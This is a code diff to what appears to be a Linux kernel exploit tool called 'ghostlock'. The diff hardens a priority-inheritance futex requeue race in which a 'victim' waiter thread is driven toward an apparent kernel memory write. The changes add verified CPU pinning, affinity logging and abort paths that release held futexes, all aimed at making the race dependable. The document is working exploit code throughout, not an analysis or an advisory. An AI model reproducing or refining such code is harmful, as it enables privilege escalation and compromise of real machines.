@@ -15,17 +15,90 @@
 using namespace ghostlock;
 
 namespace ghostlock::race {
+    /* The plan's verified-pin outcome: a worker whose CPU pin did not take
+     * reports a clean retryable failure instead of running the dance. */
+    static route::RouteStatus pin_failure_status() {
+        return route::RouteStatus{
+            .code = route::ROUTE_RETRYABLE,
+            .step = 34,
+            .error_number = EINVAL,
+        };
+    }
+
+    static bool pin_pair_ok(const PiRace &race, const char *role) {
+        if (race.main_cpu == race.consumer_cpu) {
+            pr_warning("%s pin: main=consumer=%d; refusing the pair\n",
+                       role, race.main_cpu);
+            return false;
+        }
+        return true;
+    }
+
+    /* Set one CPU and require the readback to be exactly that CPU: a mask that
+     * still lists a paused CPU, or a kernel that refunds the request, both show
+     * up here before the dance. */
+    static bool pin_thread_verified(int32_t cpu, const char *role) {
+        const auto pinned = cpu_affinity::pin_current_thread(cpu);
+        char mask[128] = "unreadable";
+        if (pinned.readback_ok) {
+            cpu_affinity::format_mask(pinned.mask, mask, sizeof(mask));
+        }
+        if (pinned.exact) {
+            pr_info("%s pin verified: cpu=%d allowed=%s\n", role, cpu, mask);
+            return true;
+        }
+        pr_warning("%s pin: cpu=%d set_rc=%d errno=%d allowed=%s\n", role, cpu,
+                   pinned.set_ok ? 0 : -1, pinned.error, mask);
+        return false;
+    }
+
+    /* The waiter holds the chain futex by the time the later checks run; the
+     * abort must release it or the blocked owner never joins. The target
+     * unlock is a no-op unless this thread acquired it in the wait. */
+    static void abort_pin_failure(PiRace *race) {
+        race->route_status = pin_failure_status();
+        race->route_done.store(1);
+        support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+        support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+    }
+
     void *waiter_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         const memory::WriteRequest *request = race->request;
         support::disable_rseq_for_thread();
         int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
         race->waiter_tid.store(tid);
+        {
+            cpu_set_t allowed;
+            char mask[128] = "unreadable";
+            if (cpu_affinity::read_mask(&allowed))
+                cpu_affinity::format_mask(allowed, mask, sizeof(mask));
+            pr_info("waiter thread tid=%d cpu=%d allowed=%s (pre-pin)\n",
+                    tid, sched_getcpu(), mask);
+        }
+        /* The waiter is the victim: it must be on main_cpu, and the pin must
+         * be exact, before the chain is built. */
+        if (!pin_pair_ok(*race, "waiter") ||
+            !pin_thread_verified(race->main_cpu, "waiter")) {
+            race->cpu_error.store(1);
+            race->route_status = pin_failure_status();
+            race->route_done.store(1);
+            return nullptr;
+        }
         if (support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
             pr_error("waiter lock chain errno=%d\n", errno);
         race->waiter_ready.store(1);
-        while (!race->owner_started.load())
+        while (!race->owner_started.load()) {
+            if (race->cpu_error.load()) {
+                abort_pin_failure(race);
+                return nullptr;
+            }
             usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
+        }
+        if (race->cpu_error.load()) {
+            abort_pin_failure(race);
+            return nullptr;
+        }
         struct timespec timeout;
         SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
         if (race->fast_repair.load()) {
@@ -45,8 +118,13 @@ namespace ghostlock::race {
             }
         }
         race->waiter_waiting.store(1);
+        pr_info("waiter pre-wait tid=%d cpu=%d\n", tid, sched_getcpu());
         support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &race->target_futex, 0);
+        if (race->cpu_error.load()) {
+            abort_pin_failure(race);
+            return nullptr;
+        }
         route::RouteController controller;
         controller.init(race, &session::g_exploit_session.profile);
         race->route_status = controller.execute(request);
@@ -75,6 +153,14 @@ namespace ghostlock::race {
     void *owner_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         support::disable_rseq_for_thread();
+        {
+            cpu_set_t allowed;
+            char mask[128] = "unreadable";
+            if (cpu_affinity::read_mask(&allowed))
+                cpu_affinity::format_mask(allowed, mask, sizeof(mask));
+            pr_info("owner thread tid=%ld cpu=%d allowed=%s (unpinned)\n",
+                    static_cast<long>(syscall(SYS_gettid)), sched_getcpu(), mask);
+        }
         long lock_target = support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
         if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
@@ -101,9 +187,16 @@ namespace ghostlock::race {
     void *consumer_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         support::disable_rseq_for_thread();
-        kernel::pin_to_core(static_cast<size_t>(race->consumer_cpu));
+        if (!pin_pair_ok(*race, "consumer") ||
+            !pin_thread_verified(race->consumer_cpu, "consumer")) {
+            race->cpu_error.store(1);
+            race->consumer_stop.store(1);
+            race->owner_stop.store(1);
+            return nullptr;
+        }
         pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
         int32_t seen = 0;
+        bool walk_logged = false;
         while (!race->consumer_stop.load()) {
             int32_t seq = race->consumer_go.load();
             if (seq == 0 || seq == seen) {
@@ -132,6 +225,16 @@ namespace ghostlock::race {
                      * started call before inflight was set, run close(fd) (a
                      * syscall on the waiter's stack) and clobber the stamp
                      * under the walk -- the G1n gate caught it. */
+                    if (!walk_logged) {
+                        cpu_set_t allowed;
+                        char mask[128] = "unreadable";
+                        if (cpu_affinity::read_mask(&allowed))
+                            cpu_affinity::format_mask(allowed, mask, sizeof(mask));
+                        pr_info("consumer pre-walk tid=%ld cpu=%d allowed=%s\n",
+                                static_cast<long>(syscall(SYS_gettid)),
+                                sched_getcpu(), mask);
+                        walk_logged = true;
+                    }
                     race->consumer_inflight.store(1);
                     race->consumer_calls.fetch_add(1);
                     errno = 0;
@@ -192,12 +295,23 @@ namespace ghostlock::race {
  * route outcome once the waiter reported completion. The count/timeout policy
  * lives in outcome_with_counters() and TODO(pi-timeout-01). */
 ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
-    while (!waiter_waiting.load() || !owner_started.load())
+    while (!waiter_waiting.load() || !owner_started.load()) {
+        if (cpu_error.load()) {
+            route_status = ghostlock::race::pin_failure_status();
+            pr_warning("[route] CPU pin failed before the dance; aborting\n");
+            return route_status;
+        }
         usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
+    }
     pr_info("[route] waiter parked; owner started\n");
     usleep(fast_repair.load()
                ? 5000
                : session::g_exploit_session.profile.race_setup_settle_us());
+    if (cpu_error.load()) {
+        route_status = ghostlock::race::pin_failure_status();
+        pr_warning("[route] CPU pin failed during setup; not running the dance\n");
+        return route_status;
+    }
     errno = 0;
     long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                 reinterpret_cast<void *>(1),
